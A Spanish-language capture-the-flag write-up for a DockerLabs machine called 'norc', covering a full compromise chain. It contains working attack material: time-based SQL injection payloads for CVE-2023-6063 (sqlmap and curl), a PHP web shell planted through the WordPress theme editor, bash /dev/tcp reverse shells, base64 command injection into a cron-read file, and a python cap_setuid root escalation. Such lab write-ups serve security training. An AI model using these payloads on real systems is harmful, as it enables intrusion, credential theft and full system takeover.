
#DockerLabs #WriteUps #Hacking

>[!NOTE] Habilidades: 
> Wordpress Fuzzing, CVE-2023-6063 - (Time Based SQL Injection), Broken Access Control, Wordpress Template Remote Code Execution, Command Injection, Python Capability `cap_setuid` Local Privilege Escalation

## Laboratorio

Lanzamos el script para iniciar el laboratorio con `docker`, asegúrense de tener `docker` activo 

![Pasted image 20241104001623](https://github.com/user-attachments/assets/39dc3518-7928-4ebf-af14-6a1f82e4a2ea)

En mi caso se está usando `podman` en vez de `docker`, es por eso que la dirección IP de la máquina será diferente 

![Pasted image 20241029233714](https://github.com/user-attachments/assets/27e6b87e-f831-4c26-8639-88668681c3cd)

Se asigna la dirección `10.88.0.2`. Agregaré la dirección IP de esta máquina al archivo `/etc/hosts` por comodidad

~~~ bash
echo '10.88.0.2 norc.local' >> /etc/hosts
~~~

![Pasted image 20241029233843](https://github.com/user-attachments/assets/ba54ba66-67d2-45b7-b12a-c9af75556699)


Comprobamos que tenemos comunicación con la máquina con un `ping`

~~~ bash
ping -c 1 norc.local
~~~

![Pasted image 20241029233237](https://github.com/user-attachments/assets/7fe232c9-f412-4c94-b758-6fb4e469e866)


# Reconocimiento
---
## Nmap 

Empezaremos haciendo un escaneo de puertos abiertos por TCP

~~~ bash
nmap --open -p- --min-rate 5000 -n -sS -v -Pn norc.local -oG allPorts
~~~

![Pasted image 20241020155256](https://github.com/user-attachments/assets/6083d92c-db6e-4ca8-a22b-392a8e419e84)

Haremos un segundo escaneo donde lanzaremos un conjunto de scripts de reconocimiento, además de detectar la versión del servicio que se ejecutan en los puertos que encontramos

~~~ bash
nmap -sVC -p 22,80 norc.local -oN services
~~~

![Pasted image 20241029234555](https://github.com/user-attachments/assets/e7b7c139-47ad-4622-993d-583cc3ff568d)


Vemos que nos intenta redirigir a `norc.labs`, pero nuestra máquina no conoce esa dirección

![Pasted image 20241020155953](https://github.com/user-attachments/assets/9ec771c8-ca87-49e5-84c4-746f2168e0df)

Se está aplicando `virtual hosting` en esta máquina, por lo que nosotros por ahora no conocemos `norc.labs`, entonces para que pueda hacer la redirección, agregamos este dominio a nuestro archivo `/etc/hosts`

![Pasted image 20241020160158](https://github.com/user-attachments/assets/4ed9f441-0886-4e18-b4ce-ea6cd1f0c78f)

Vemos que ahora nos redirige, y nos encontramos con el siguiente formulario donde nos pide ingresar una contraseña

Si interceptamos la solicitud con `Burpsuite` podemos ver lo siguiente

![Pasted image 20241021232106](https://github.com/user-attachments/assets/6954d333-19f7-4b64-842a-309b435eab1c)

¿Acabo de ver Wordpress?, probemos intentar a `wp-admin`

![Pasted image 20241021232335](https://github.com/user-attachments/assets/c3545750-296c-49e7-b303-8c6362560523)

Nos redirige al `login` de `wordpress`, si intentamos ingresar credenciales nos aparece este mensaje

![Pasted image 20241021233030](https://github.com/user-attachments/assets/436a3650-0f08-474b-a8ee-f1f820a61559)

## Whatweb

Con esta herramienta veremos las tecnologías que se están ejecutando en la máquina víctima

~~~ bash
whatweb http://norc.labs/ghost-login
~~~

![Pasted image 20241021234854](https://github.com/user-attachments/assets/9f549e9b-5784-4aba-b075-3fd8520c790f)

Se está ejecutando Drupal 8, pero tiene aspecto de `wordpress`, WTF

## Fuzzing

Intentemos descubrir rutas o archivos posibles bajo el dominio `norc.labs`, en esta ocasión usaremos `ffuf`

~~~ bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/CMS/Drupal.txt -mc 200 -u http://norc.labs/FUZZ 
~~~

![Pasted image 20241022220105](https://github.com/user-attachments/assets/8e8eb96a-edd7-40a4-a74b-85fff2c88da7)

Encontramos un `robots.txt`, que es un archivo comúnmente usado para gestionar la navegación en un sitio web, echemos un vistazo

![Pasted image 20241022220805](https://github.com/user-attachments/assets/25152bca-eaa4-4288-9c98-424bcee93fcb)

![Pasted image 20241022220834](https://github.com/user-attachments/assets/517b2217-5a5a-4838-9f86-9a81402fb294)

El archivo `sitemap` contiene una lista de todas las páginas de un sitio web, veamos que contiene

![Pasted image 20241022222100](https://github.com/user-attachments/assets/7e6b8a0d-1788-4314-b260-ebe51c329d14)

Sin embargo, nos redirige al `login`, así que mejor intentemos otra cosa, como intentar buscar `plugins`

## Wordpress Plugins Fuzzing

Existe una recopilación bastante extensa de `plugins` de `wordpress` en este repositorio de `github`, es una buena opción si queremos solamente hacer fuzzing para descubrir `plugins`
- https://raw.githubusercontent.com/RandomRobbieBF/wordpress-plugin-list/refs/heads/main/wp-plugins.lst

En mi caso lo descargaré en la carpeta actual, simplemente con `curl` podemos descargar el archivo y guardarlo, en mi caso lo llamaré `wordpress-plugins.txt`

~~~ bash
curl -sL https://raw.githubusercontent.com/RandomRobbieBF/wordpress-plugin-list/refs/heads/main/wp-plugins.lst -o wordpress-plugins.txt
~~~

![Pasted image 20241029230845](https://github.com/user-attachments/assets/251e199f-bab5-44c9-b42a-6580486ffa0b)

Una vez tengamos nuestro diccionario de `plugins` preparado, usaremos `ffuf` para descubrir `plugins`

~~~ bash
ffuf -w wordpress-plugins.txt -u http://norc.labs/FUZZ -t 200 -mc 200
~~~

- `-w`: Ruta al diccionario a utilizar
- `-u`: URL a aplicar fuzzing
- `-t`: Hilos a utilizar
- `-mc`: Mostrar solo los códigos de estado que especifiquemos, en este caso, `200 (OK)`

![Pasted image 20241029232759](https://github.com/user-attachments/assets/c9e10b69-9b27-4307-be3d-88b5432aa174)

Luego de una larga espera, la herramienta ha encontrado los siguientes archivos `readme.txt` que pertenecen a diferentes `plugins`

- `/wp-content/plugins/password-protected/readme.txt`
- `/wp-content/plugins/loginizer/readme.txt`

No encontraba vulnerabilidades conocidas para la versión de estos `plugins`, hasta que encontré un `plugin` más

![Pasted image 20241030001309](https://github.com/user-attachments/assets/75a70c0f-dc38-4e77-a584-2fac64c01e00)

- `/wp-content/plugins/wp-fastest-cache/readme.txt`

Podemos ver la versión del `plugin` y ver si existe alguna vulnerabilidad conocida para la versión de estos `plugins`, podemos extraer la versión con el siguiente comando que busca dentro de los archivos encontrados

~~~ bash
curl -sL http://norc.labs/wp-content/plugins/wp-fastest-cache/readme.txt | grep "Stable" | awk -F ':' '{print $2}' | xargs echo 'version: '
~~~

![Pasted image 20241030002631](https://github.com/user-attachments/assets/d8072719-e42f-417a-87c0-b86da3bbb717)

Busqué en internet por exploits hasta que me encontré que `wp-fastest-cache`, posee un CVE para la versión que se está ejecutando en esta máquina

- https://wpscan.com/blog/unauthenticated-sql-injection-vulnerability-addressed-in-wp-fastest-cache-1-2-2/


# Explotación 
---

## CVE-2023-6063 - Unauthenticated Time Based SQL Injection

Esta vulnerabilidad es de tipo `Time Based`, por lo que podremos saber si nuestras consultas se ejecutan mediante una espera por parte de la respuesta del servidor

**En este caso, tendríamos una cookie que es vulnerable, `wordpress_logged_in`**

- Prueba de concepto: https://github.com/motikan2010/CVE-2023-6063-PoC

Vemos que incluso está presente en `norc.labs`

![Pasted image 20241030131924](https://github.com/user-attachments/assets/361e6ccb-3eee-4f07-8610-a6e5af3233f1)

## SQLmap

Haremos una explotación mediante la herramienta `sqlmap`, que hará que el ataque sea más fácil, pero intentaremos entender cómo funcionan las consultas que envía

### wp_users

Asumiremos que existe una base de datos `wordpress`, entonces debemos ajustar `sqlmap` para que haga consultas a esta base de datos

~~~ bash
sqlmap --dbms=mysql -u "http://norc.labs/wp-login.php" --cookie='wordpress_logged_in=*' --level=2 -D wordpress -T wp_users --dump --batch
-v2
~~~

- `--dmbs`: Definir el motor de base de datos, en este caso `mysql`
- `-u`: URL
- `--cookie='wordpress_logged_in=*'`: Asignar una cookie a la consulta, **esta cookie es vulnerable a SQL Injection**
- `*`: Valor donde se ingresa el `payload`, en este caso, en la cookie `wordpress_logged_in`
- `--level`: Indica el nivel de intensidad en las pruebas
- `-D`: Especificar el nombre de la base de datos
- `-T`: Nombre de una tabla
- `--dump`: Listar los registros
- `--batch`: Omitir las preguntas al usuario
- `-v2`: Ver información por consola

![Pasted image 20241030132119](https://github.com/user-attachments/assets/3b936336-3177-4c3f-8df2-2c4910e797c0)

Este sería el `payload` que está enviando `sqlmap` para intentar 

~~~ sql
AND (SELECT 9419 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x77705f7573657273 AND table_schema=0x776f72647072657373 LIMIT 0,1),2,1))>64,0,5)))))CLKl) AND "wCCa"="wCCa
~~~

![Pasted image 20241030021501](https://github.com/user-attachments/assets/ffb518ad-0688-4160-9a9b-f20132a38a3d)

`sqlmap` nos dumpeó este registro de la tabla `wp_users`

![Pasted image 20241030023157](https://github.com/user-attachments/assets/4e52cf9c-fe0a-498d-bae7-a73d5ab8d325)

- Tenemos por un lado el `hash`, que intentaremos crackearlo más adelante
- Vemos el nombre de usuario (`admin`)
- Se nos muestra un dominio para el usuario `admin`, `oledockers.norc.labs`

Agregaremos este nuevo dominio a nuestro archivo `/etc/hosts`

![Pasted image 20241030131156](https://github.com/user-attachments/assets/aa04a6b1-579b-4683-b9c4-dff731d15cb0)

## Explotación Manual

Podemos explotar manualmente esta vulnerabilidad con el siguiente comando, en este caso, se está comprobando si la longitud del nombre de usuario `admin` (asumiendo que existe) es `5`, entonces el servidor esperará 5 segundos para enviarnos la respuesta

~~~ bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: norc.labs' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' -H $'Content-Length: 21' -H $'Connection: close' \
    -b $'wordpress_logged_in=\" AND (SELECT 100 FROM (SELECT(SLEEP(5)) WHERE (SELECT LENGTH(user_login) FROM wp_users WHERE user_login=\'admin\')=5)TempTable) AND \"a\"=\"a' \
    $'http://norc.labs/wp-login.php'
~~~

En `burpsuite` podemos hacer esto de forma más legible

https://github.com/user-attachments/assets/bb29914b-c459-407c-9d29-9a9485965054


`Hashes.com `nos da una pista sobre el algoritmo utilizado para encriptar esta contraseña

![Pasted image 20241030023917](https://github.com/user-attachments/assets/89b7815b-cfc1-407c-9d4d-e159cd2ca096)

## John
Guardamos el hash en un archivo

~~~ bash
echo '$P$BeNShJ/iBpuokTEP2/94.sLS8ejRo6.' >> hash
~~~

Intentamos crackear el `hash` que hemos obtenido con `john`, pero no tendremos éxito

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
~~~

![Pasted image 20241030132503](https://github.com/user-attachments/assets/36c0320c-0ac5-45fc-a48c-f4708066f22e)

Volvamos a ver los datos que recolectamos, si exploramos el nuevo dominio en el navegador, nos redirige a lo siguiente

![Pasted image 20241030131326](https://github.com/user-attachments/assets/ee0a00d5-ae42-48e0-be28-b5e0d6577eb8)

Bueno... Podemos usar esta nueva contraseña para intentar entrar directamente en `wp-admin`

~~~ txt
admin:wWZvgxRz3jMBQ ZN
~~~

![Pasted image 20241030131547](https://github.com/user-attachments/assets/821abc1e-cd7a-45de-86b3-a9dec4eb8b9f)

![Pasted image 20241030131600](https://github.com/user-attachments/assets/45a8513f-2cfe-4151-abe3-88509b6d27f0)

¡Estamos dentro de `wordpress`!, el siguiente paso sería buscar una forma de ganar acceso al sistema operativo

## Remote Code Execution

Podemos abusar del editor de temas de `wordpress` para editar archivos php de algún tema para ejecutar un comando, en mi caso, seleccionaré el tema Twenty Twenty Three.

~~~ php
system($_GET['cmd']);
~~~

He seleccionado el archivo `hidden-404.php`

![Pasted image 20241031001142](https://github.com/user-attachments/assets/561466d6-cbb5-4903-b303-de3a992d8a47)

Entonces ahora debemos hacer una solicitud a este archivo especificando el parámetro `cmd` en la URL

~~~ bash
http://norc.labs/wp-content/themes/twentytwentythree/patterns/hidden-404.php?cmd=whoami
~~~

![Pasted image 20241031004055](https://github.com/user-attachments/assets/b6abe45b-d836-4d4b-bd1e-237cdea4dc11)

## Reverse Shell

Enviaríamos este comando a través del parámetro `cmd`, en este caso, podemos enviar directamente el siguiente comando con algunos caracteres codificados

~~~ bash
bash -c "bash -i >&/dev/tcp/10.88.0.1/443 0>&1"
~~~

Antes de enviar la solicitud no olvidemos lanzar un `listener` con `nc`

~~~ bash
nc -lvnp 443
~~~

![Pasted image 20241031002132](https://github.com/user-attachments/assets/20ba7f03-2dd1-4a88-b295-2403be8f0344)

Finalmente ejecutamos...

~~~ bash
http://norc.labs/wp-content/themes/twentytwentythree/patterns/hidden-404.php?cmd=bash -c "bash -i >%26%2Fdev%2Ftcp%2F10.88.0.1%2F443 0>%261"
~~~

![Pasted image 20241031002450](https://github.com/user-attachments/assets/6d02c8fe-2891-4575-a4df-9c19dbe97341)

![Pasted image 20241031002907](https://github.com/user-attachments/assets/eafd483b-7cc4-4c41-82f3-b41e26f1ea64)


# Escalada de privilegios
---
## Tratamiento de la TTY

Haremos un procedimiento para poder tener una consola más interactiva (`Ctrl + C`, `Ctrl + L`), en la máquina víctima ejecutamos los siguientes comandos

~~~ bash
script /dev/null -c bash
export TERM=xterm
~~~

En este punto presionamos  CTRL + Z, volveremos a nuestra máquina, solamente hemos dejado el proceso en segundo plano

~~~ bash
stty raw -echo; fg
~~~

Una vez volvimos a la `reverse shell`, volvemos a iniciar la terminal

~~~ bash
reset xterm
~~~

Por último debemos ajustar el tamaño de la terminal, vemos nuestras proporciones en **nuestra máquina**

~~~ bash
stty size
~~~

~~~ bash
22 85
~~~

Ahora usamos la salida de este comando para ajustar las proporciones en la `reverse shell`, las dimensiones podrán variar de acuerdo con el tamaño de tu ventana en la terminal

~~~ bash
stty rows 22 columns 85
~~~

## Buscando formas de escalar

Primero comprobamos los privilegios sudo, pero vemos que no existe en la máquina

![Pasted image 20241031005002](https://github.com/user-attachments/assets/11ae9c5e-d11a-4759-944f-385896c45728)

Buscaremos binarios que tengan el bit SUID asignado para poder ejecutarlos con privilegios 

~~~ bash
find / -perm /4000 2>/dev/null
~~~

![Pasted image 20241103220448](https://github.com/user-attachments/assets/aa72e57f-f014-4b86-ad57-98e64040f928)

Vemos `exim4` al final de la salida, pero su versión no es vulnerable a CVE-2019-10149, por lo que debemos seguir buscando una forma para elevar nuestros privilegios

## Capabilities

Listaremos las capabilities en la máquina víctima

~~~ bash
getcap -r / 2>/dev/null
~~~

![Pasted image 20241103221839](https://github.com/user-attachments/assets/8b03928e-283e-466a-9589-f9b418b9d48d)

Con `setuid` configurado en teoría podríamos elevar nuestro privilegio al cambiar el UID de la `bash`

![Pasted image 20241103231646](https://github.com/user-attachments/assets/573bf7e7-a216-48aa-959d-8af213e5721f)

Usaremos este comando para intentar escalar privilegios aprovechando la capacidad que tenemos de cambiar el UID del proceso de `python`

~~~ python
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
~~~

![Pasted image 20241104000009](https://github.com/user-attachments/assets/69130edb-9b2c-4517-b016-fc7892cd95d9)

Pero vemos que no podemos ejecutar esta operación por un conflicto de privilegios, quizá estamos omitiendo algún paso o no estamos revisando lo suficiente. Veamos los usuarios existentes en esta máquina

~~~ bash
cat /etc/passwd
~~~

![Pasted image 20241103230134](https://github.com/user-attachments/assets/317624c2-eba2-4090-8352-b6e92ec44b51)

Vemos un usuario `kvzlx`, veamos si podemos ver lo que hay en su directorio en `/home`

![Pasted image 20241103223538](https://github.com/user-attachments/assets/265a4527-af46-4436-bf89-60f42191c64b)


Efectivamente podemos ver el contenido de esta carpeta, vemos un script de `bash`, este script hace lo siguiente

- Recibe una contraseña del archivo `.wp-encrypted.txt`
- Decodifica la contraseña que está en `base64`
- Almacena la contraseña en `/tmp/decoded.txt`
- Ejecuta la contraseña como un comando

## Command Injection

Como está ejecutando lo que recibe del archivo `.wp-encrypted.txt` sin sanitizar el contenido, podemos inyectar un comando a nivel de sistema en este archivo, enviemos una `shell` como el usuario que ejecuta este script a nuestra máquina atacante por el puerto `4444`, y esperaremos a ver si el código se ejecuta en algún momento

~~~ bash
echo "bash -c 'bash -i >& /dev/tcp/172.17.0.1/1235 0>&1'"| base64
~~~

![Pasted image 20241103233558](https://github.com/user-attachments/assets/3455968f-b073-457d-8eef-a3263120bc5a)

En unos segundos recibimos una  `shell` como el usuario `kvzlx` en `nc`

![Pasted image 20241103234633](https://github.com/user-attachments/assets/d1952ced-b0ba-4d22-9532-5a74cbe9c82e)

Nuevamente haremos un tratamiento para usar esta consola de forma más cómoda y con nuestras proporciones

![Pasted image 20241103234757](https://github.com/user-attachments/assets/67491fc2-efe1-4b5d-9a82-daece68af7ec)

Si hacemos una vista de los procesos que este usuario ejecuta, podemos ver que se está ejecutando el archivo `.cron_script.sh` que vimos anteriormente

~~~ bash
ps -aux
~~~

![Pasted image 20241103235221](https://github.com/user-attachments/assets/d9b118fc-0bcb-455b-a6ff-c56926d60aa9)

Siempre que tengamos acceso a un nuevo usuario debemos volver a buscar formas de escalar privilegios. como `sudo`, `suid`, `capabilities`, etc. En este caso obtuve el mismo resultado al listar las capabilities del binario `/opt/python`

~~~ bash
/sbin/getcap -r / 2>/dev/null
~~~

![Pasted image 20241104001110](https://github.com/user-attachments/assets/08a6cd3b-cfe6-4304-a7e8-9e1cc42a1983)

## Root Time

Intentaremos usar la `capability` que tenemos asignada en `/opt/python` para escalar nuestro privilegio de igual forma que lo intentamos con el usuario `www-data`

~~~ python
/opt/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
~~~

![Pasted image 20241103235740](https://github.com/user-attachments/assets/65ad32e5-17b8-4e84-879b-82e4419fe65e)
